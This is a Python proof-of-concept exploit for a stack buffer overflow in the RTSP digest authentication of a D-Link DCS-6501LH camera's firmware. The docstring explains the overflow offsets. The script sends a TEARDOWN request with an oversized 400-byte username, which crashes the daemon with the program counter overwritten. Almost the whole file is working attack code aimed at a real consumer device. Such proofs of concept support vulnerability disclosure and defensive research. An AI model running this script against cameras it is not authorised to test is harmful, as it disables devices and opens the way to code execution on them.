#!/usr/bin/env python3
"""Proof of concept for the stack buffer overflow in the RTSP digest
authentication of D-Link DCS-6501LH firmware V3.03.02 (aoni_ipc).

ValidateAuthorizationHeader copies the Digest "username" into an 80-byte stack
buffer with the length taken from the header.  The buffer sits 348 bytes below
the saved return address, so a username longer than 348 bytes overwrites saved
registers and the return address; a 400-byte username of 'A' makes the daemon
crash with pc = ra = 0x41414141.

Non-destructive: only RTSP requests are sent; nothing is stored on the device.

Usage:
    python3 poc.py <host> [port]
"""
import socket
import sys

PORT = 554
SESSION = "/live/echoshow/video"
FILL = "A"
LONG = 400


def request(username, cseq):
    url = "rtsp://%s:%d%s" % (HOST, PORT, SESSION)
    auth = ('Digest username="%s", realm="", nonce="n", uri="%s", '
            'response="z"' % (username, url))
    return ("TEARDOWN %s RTSP/1.0\r\nCSeq: %d\r\n"
            "Authorization: %s\r\n\r\n" % (url, cseq, auth)).encode()


def send(payload, read=300):
    sock = socket.create_connection((HOST, PORT), 5)
    try:
        sock.sendall(payload)
        sock.settimeout(5)
        try:
            return sock.recv(read)
        except socket.timeout:
            return b""
    finally:
        sock.close()


def main():
    global HOST, PORT
    HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 554

    print("[*] target %s:%d session %s" % (HOST, PORT, SESSION))

    resp = send(request("admin", 1))
    print("[*] control (5-byte username): %r" % resp[:80])
    print("    expected: 401 Unauthorized, service stays up")

    resp = send(request(FILL * LONG, 2))
    print("[*] overflow (%d-byte username): %r" % (LONG, resp[:80]))
    print("    expected: no response; daemon crashes with pc = ra = 0x41414141")


if __name__ == "__main__":
    HOST = "127.0.0.1"
    main()
